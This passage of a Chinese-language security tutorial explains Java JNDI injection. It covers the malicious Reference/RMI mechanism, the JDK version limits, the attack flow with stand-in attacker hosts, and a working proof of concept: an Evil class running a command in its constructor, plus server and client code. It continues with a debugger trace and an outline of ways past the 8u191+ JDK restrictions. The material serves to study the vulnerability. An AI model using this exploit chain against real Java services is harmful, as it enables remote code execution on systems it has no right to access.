<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 第一个参数是远程加载时所使用的类名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 第二个参数是要加载的类的完整类名(这两个参数可能有点让人难以琢磨，往下看你就明白了）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 第三个参数就是远程class文件存放的地址了</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reference refObj = new Reference(&quot;refClassName&quot;, &quot;insClassName&quot;, &quot;http://example.com:8888/&quot;); </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">registry.bind(&quot;refObj&quot;, refObjWrapper);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当有客户端通过**<code>lookup(&quot;refObj&quot;)</code><strong>获取远程对象时，获取的是一个Reference存根（Stub),由于是Reference的存根，所以客户端会现在本地的classpath中去检查是否存在类<code>refClassName</code>，如果不存在则去指定的url（<a href="http://example.com:8888/refClassName.class%EF%BC%89%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%B0%83%E7%94%A8%60insClassName%60%E7%9A%84**%E6%97%A0%E5%8F%82%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0**%EF%BC%8C%E6%89%80%E4%BB%A5**%E5%8F%AF%E4%BB%A5%E5%9C%A8%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E9%87%8C%E5%86%99%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E3%80%82%E5%BD%93%E7%84%B6%E9%99%A4%E4%BA%86%E5%9C%A8%E6%97%A0%E5%8F%82%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%AD%E5%86%99%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%8C%E8%BF%98%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8java%E7%9A%84" target="_blank" rel="noopener noreferrer">http://example.com:8888/refClassName.class）动态加载，并且调用`insClassName`的**无参构造函数**，所以**可以在构造函数里写恶意代码。当然除了在无参构造函数中写利用代码，还可以利用java的</a> <code>static代码块</code> 来写恶意代码，因为static代码块的代码在class文件被加载过后就会立即执行，且只执行一次。</strong></p>
<p>了解更多关于static代码块，参考：<a href="https://www.cnblogs.com/panjun-donet/archive/2010/08/10/1796209.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/panjun-donet/archive/2010/08/10/1796209.html</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jndi注入">JNDI注入<a href="#jndi注入" class="hash-link" aria-label="JNDI注入的直接链接" title="JNDI注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jndi注入原理">JNDI注入原理<a href="#jndi注入原理" class="hash-link" aria-label="JNDI注入原理的直接链接" title="JNDI注入原理的直接链接">​</a></h3>
<p>就是将恶意的<code>Reference类</code>绑定在RMI注册表中，其中恶意引用指向远程恶意的<code>class文件</code>，<strong>当用户在JNDI客户端的<code>lookup()</code>函数参数外部可控或<code>Reference类</code>构造方法的<code>classFactoryLocation参数</code>外部可控时</strong>，会使用户的JNDI客户端访问RMI注册表中绑定的恶意<code>Reference类</code>，从而加载远程服务器上的恶意<code>class文件</code>在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</p>
<p><img decoding="async" loading="lazy" alt="image-20210809203123843" src="/assets/images/image-20210809203123843-278042e07e2021ab52c17d0ab8eb9546.png" width="976" height="501" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jndi注入的利用条件">JNDI注入的利用条件<a href="#jndi注入的利用条件" class="hash-link" aria-label="JNDI注入的利用条件的直接链接" title="JNDI注入的利用条件的直接链接">​</a></h3>
<ul>
<li>客户端的<code>lookup()</code>方法的参数可控</li>
<li>服务端在使用<code>Reference类</code>时，<code>classFactoryLocation</code>参数可控</li>
</ul>
<p>上面两个都是在编写程序时可能存在的脆弱点（<strong>任意一个满足就行</strong>），除此之外，jdk版本在JNDI注入中也起着至关重要的作用，而且不同的攻击Payload对jdk的版本要求也不一致，这里就全部列出来：</p>
<ul>
<li><strong>JDK 6u45、7u21之后</strong>：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为<code>true</code>。当该值为<code>true</code>时，将禁用自动加载远程类文件，仅从<code>CLASSPATH</code>和当前JVM的<code>java.rmi.server.codebase</code>指定路径加载类文件。使用这个属性来防止客户端JVM从其他<code>Codebase</code>地址上动态加载类，增加了<code>RMI ClassLoader</code>的安全性。</li>
<li><strong>JDK 6u141、7u131、8u121之后：<strong>增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>RMI</code>和<code>CORBA</code>协议使用远程<code>codebase</code>的选项，因此<code>RMI</code>和<code>CORBA</code>在以上的JDK版本上已经无法触发该漏洞，但依然可以</strong>通过指定URI为LDAP协议来进行JNDI注入攻击</strong>。</li>
<li>**JDK 6u211、7u201、8u191之后：**增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>LDAP</code>协议使用远程<code>codebase</code>的选项，把LDAP协议的攻击途径也给禁了。</li>
</ul>
<blockquote>
<p>可以看出RMI的Codebase限制明显比LDAP多，所以我们在日站的时候，最好也是用LDAP来进行注入。</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jndi注入攻击流程">JNDI注入攻击流程<a href="#jndi注入攻击流程" class="hash-link" aria-label="JNDI注入攻击流程的直接链接" title="JNDI注入攻击流程的直接链接">​</a></h3>
<ol>
<li>攻击者通过可控url触发动态协议转换(<code>rmi://attack:1090/Exploit</code>)</li>
<li>受害者服务器原上下文环境被转换为<code>rmi://attack:1090/Exploit</code></li>
<li>受害者服务器去<code>rmi://attack:1090/Exploit</code>请求绑定对象Exploit，攻击者实现准备好的RMI服务器返回一个<code>ReferenceWrapper</code>对象(<code>Reference(&quot;Class1&quot;,&quot;Class2&quot;,&quot;http://evil:8080/&quot;)</code>)</li>
<li>应用获取到<code>ReferenceWrapper</code>开始在本地查找<code>Class1</code>，发现无，则去请求<code>http://evil:8080/Class2.class</code></li>
<li>web服务器返回事先准备好的恶意class文件，受害者服务器调用<code>Class2</code>的构造方法，恶意代码执行</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jndi注入举例">JNDI注入举例<a href="#jndi注入举例" class="hash-link" aria-label="JNDI注入举例的直接链接" title="JNDI注入举例的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="创建恶意类evil不能带package">创建恶意类Evil（不能带package）<a href="#创建恶意类evil不能带package" class="hash-link" aria-label="创建恶意类Evil（不能带package）的直接链接" title="创建恶意类Evil（不能带package）的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.Context;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.Name;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.spi.ObjectFactory;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.BufferedReader;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.InputStreamReader;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Hashtable;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Evil implements ObjectFactory {    // 实现接口ObjectFactory，不然会报错，虽然不影响执行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Evil() throws IOException {  // 构造方法，加载时会自动调用</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exec(&quot;open -na Calculator&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void exec(String cmd) throws IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Process runcmd = Runtime.getRuntime().exec(cmd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InputStreamReader inputStreamReader = new InputStreamReader(runcmd.getInputStream());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String tmp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        while ((tmp = bufferedReader.readLine()) != null){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(tmp);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inputStreamReader.close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bufferedReader.close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="常见rmi服务端绑定恶意的reference到rmi注册表">常见RMI服务端，绑定恶意的Reference到rmi注册表<a href="#常见rmi服务端绑定恶意的reference到rmi注册表" class="hash-link" aria-label="常见RMI服务端，绑定恶意的Reference到rmi注册表的直接链接" title="常见RMI服务端，绑定恶意的Reference到rmi注册表的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.Context;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.InitialContext;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.NamingException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.Reference;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.registry.LocateRegistry;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Properties;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws IOException, NamingException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Properties env = new Properties();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        env.put(Context.PROVIDER_URL,&quot;rmi://127.0.0.1:1099&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //初始化环境</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InitialContext ctx = new InitialContext(env);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 创建一个注册表</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        LocateRegistry.createRegistry(1099);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 绑定恶意的Reference到rmi注册表</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 注意，classFactoryLocation地址后面一定要加上/ 如果不加上/，那么则向web服务请求恶意字节码的时候，则会找不到该字节码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Reference reference = new Reference(&quot;Evil&quot;, &quot;Evil&quot;, &quot;http://127.0.0.1:8888/&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ctx.bind(&quot;evil&quot;, referenceWrapper);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210817111107687" src="/assets/images/image-20210817111107687-6d09a1fb2256bc7fd1ca18cb5e422aae.png" width="3098" height="1186" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="客户端远程调用evil对应类">客户端远程调用evil对应类<a href="#客户端远程调用evil对应类" class="hash-link" aria-label="客户端远程调用evil对应类的直接链接" title="客户端远程调用evil对应类的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.InitialContext;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.NamingException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Client {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws NamingException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, String.valueOf(true));   // 参考上面的利用条件，低版本不需要设置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, String.valueOf(true));  // 参考上面的利用条件，低版本不需要设置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //初始化环境</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InitialContext init = new InitialContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 远程调用evil，然后找不到服务端类Evil，就会调用http://127.0.0.1:8888/Evil.class</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        init.lookup(&quot;rmi://127.0.0.1:1099/evil&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="步骤">步骤<a href="#步骤" class="hash-link" aria-label="步骤的直接链接" title="步骤的直接链接">​</a></h4>
<ul>
<li>启动RMI服务端</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20210816172243979" src="/assets/images/image-20210816172243979-e89597243abb6b4cbd25b82d05ec1503.png" width="3584" height="2240" class="img_ev3q"></p>
<ul>
<li>编译<code>Evil.java</code>为<code>Evil.class</code>，并启动<code>http</code>服务</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20210816172437499" src="/assets/images/image-20210816172437499-b8d05afc2b0f7e3c3de82c7f8827882a.png" width="2002" height="940" class="img_ev3q"></p>
<ul>
<li>客户端运行，远程调用<code>evil</code></li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20210816172517617" src="/assets/images/image-20210816172517617-4c3579ece5738dd5f39a313673348925.png" width="3580" height="2180" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jndi注入debug">JNDI注入Debug<a href="#jndi注入debug" class="hash-link" aria-label="JNDI注入Debug的直接链接" title="JNDI注入Debug的直接链接">​</a></h3>
<p>在<code>lookup</code>下断点进行分析</p>
<p><img decoding="async" loading="lazy" src="/assets/images/image-20210817124753356-cbac9ac698a8a1def29db0649afb2861.png" width="2556" height="1736" class="img_ev3q"></p>
<p>堆栈调用情况</p>
<p><img decoding="async" loading="lazy" alt="image-20210817165611951" src="/assets/images/image-20210817165611951-8d217030f2ea4ddfe407d6ddff157a41.png" width="1110" height="522" class="img_ev3q"></p>
<p>首先调用<code>InitialContext.lookup</code>，<code>getURLOrDefaultInitCtx</code>函数会分析<code>name</code>的协议头返回对应协议的环境对象，此处返回<code>Context</code>对象的子类<code>rmiURLContext</code>对象，然后在对应协议中去<code>lookup</code>搜索</p>
<p><img decoding="async" loading="lazy" alt="image-20210817160721357" src="/assets/images/image-20210817160721357-07fd9e4cbc76ba97a2b93293b1bf0a2b.png" width="1918" height="878" class="img_ev3q"></p>
<p>然后就会调用<code>GenericURLContext.lookup()</code>方法，此处<code>this</code>为<code>rmiURLContext</code>类调用对应类的<code>getRootURLContext</code>类为解析RMI地址，不同协议调用这个函数，根据之前<code>getURLOrDefaultInitCtx(name)</code>返回对象的类型不同，执行不同的<code>getRootURLContext</code>，进入不同的协议路线。</p>
<p><img decoding="async" loading="lazy" alt="image-20210817163036320" src="/assets/images/image-20210817163036320-aa16ddfb2e4936657bc5a61e6b19d51b.png" width="2928" height="1200" class="img_ev3q"></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public Object lookup(String var1) throws NamingException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		// 获取rmi注册中心的相关数据</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	    // 获取注册中心对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Context var3 = (Context)var2.getResolvedObj();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Object var4;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 去注册中心lookup，进入此处 lookup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            var4 = var3.lookup(var2.getRemainingName());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } finally {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            var3.close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return var4;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>跟进<code>lookup</code>，此处调用的是<code>RegistryContext.lookup()</code></p>
<blockquote>
<p>其中从RMI注册表中<code>lookup</code>查询到服务端中目标类的<code>Reference</code>后返回一个<code>ReferenceWrapper_Stub</code>类实例，该类实例就是客户端的存根、用于实现和服务端进行交互，最后调用<code>decodeObject()</code>函数来解析</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20210817163351251" src="/assets/images/image-20210817163351251-2dc935bf6733ec7360932b1dbe4bda42.png" width="3300" height="1058" class="img_ev3q"></p>
<p>然后跟进<code>RegistryContext.decodeObject</code>，先判断入参<code>ReferenceWrapper_Stub</code>类实例是否是<code>RemoteReference</code>接口实现类实例，而<code>ReferenceWrapper_Stub</code>类正是实现<code>RemoteReference</code>接口类的，因此通过判断调用<code>getReference()</code>来获取到<code>ReferenceWrapper_Stub</code>类实例中的<code>Reference</code>即我们在恶意RMI注册中绑定的恶意<code>Reference</code>；再往下调用<code>NamingManager.getObjectInstance()</code>来获取远程服务端上的类实例</p>
<p><img decoding="async" loading="lazy" alt="image-20210817163754175" src="/assets/images/image-20210817163754175-10504ac0b9c05238b16ddb016c988eb4.png" width="3582" height="2024" class="img_ev3q"></p>
<p>继续跟<code>NamingManager.getObjectInstance()</code></p>
<p><img decoding="async" loading="lazy" alt="image-20210817163956193" src="/assets/images/image-20210817163956193-edc18cdebb03a48caafa6ac7524f80a8.png" width="2782" height="1540" class="img_ev3q"></p>
<p>进入<code>getObjectFactoryFromReference</code>，到<code>loadClass()</code>时，就会向工厂请求恶意的<code>class</code></p>
<p><img decoding="async" loading="lazy" alt="image-20210817165349901" src="/assets/images/image-20210817165349901-ed11a146320c65228d346335fc7d7268.png" width="2774" height="1722" class="img_ev3q"></p>
<p>然后看到了熟悉的<code>newInstance()</code>（实例化），想想写的<code>Evil.java</code> 只有一个构造函数，实例化之后，就会执行构造函数中的恶意代码。</p>
<p><img decoding="async" loading="lazy" alt="image-20210817164115121" src="/assets/images/image-20210817164115121-c384db1c5febf90571235cbf413b9f09.png" width="2204" height="1458" class="img_ev3q"></p>
<p>实例化后：</p>
<p><img decoding="async" loading="lazy" alt="image-20210817165516619" src="/assets/images/image-20210817165516619-760698b23a3d03f943fb656b5e2ea405.png" width="3582" height="2188" class="img_ev3q"></p>
<p>继续跟，<code>getObjectFactoryFromReference()</code>返回的类需要为<code>ObjectFactory</code>，所以这里也是<strong>为什么我们的恶意类要实现<code>ObjectFactory</code>这个接口</strong>，不然会报错，但是不影响执行。</p>
<p><img decoding="async" loading="lazy" alt="image-20210817170040839" src="/assets/images/image-20210817170040839-f01d6839b42926fc7ca36ecaadbeefea.png" width="1758" height="1404" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="绕过高版本jdk8u191限制">绕过高版本JDK（8u191+）限制<a href="#绕过高版本jdk8u191限制" class="hash-link" aria-label="绕过高版本JDK（8u191+）限制的直接链接" title="绕过高版本JDK（8u191+）限制的直接链接">​</a></h2>
<blockquote>
<p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener noreferrer">如何绕过高版本JDK的限制进行JNDI注入利用</a></p>
<p><a href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%846.JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#0x02-%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%EF%BC%888u191-%EF%BC%89%E9%99%90%E5%88%B6" target="_blank" rel="noopener noreferrer">绕过高版本JDK（8u191+）限制</a></p>
<p><a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/" target="_blank" rel="noopener noreferrer">Exploitng JNDI Injection In Java</a></p>
</blockquote>
<p>由前面知道，在JDK  6u211、7u201、8u191、11.0.1之后，增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p>
<p>两种绕过方法如下：</p>
<ol>
<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>
<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
</ol>
<p>这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</p>
<p>简单地说，<strong>在低版本JDK的JNDI注入中，主要利用的就是<code>classFactoryLocation</code>这个参数来实现远程加载类利用的。但是在高版本JDK中对<code>classFactoryLocation</code>这个途径实现了限制，但是对于<code>classFactory</code>这个参数即本地<code>ClassPath</code>中如果存在Gadget的话还是能够进行JNDI注入攻击的</strong>。</p>
<p>我们先来看一些基本概念，然后再分析这两种绕过方法。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="关于codebase">关于Codebase<a href="#关于codebase" class="hash-link" aria-label="关于Codebase的直接链接" title="关于Codebase的直接链接">​</a></h3>
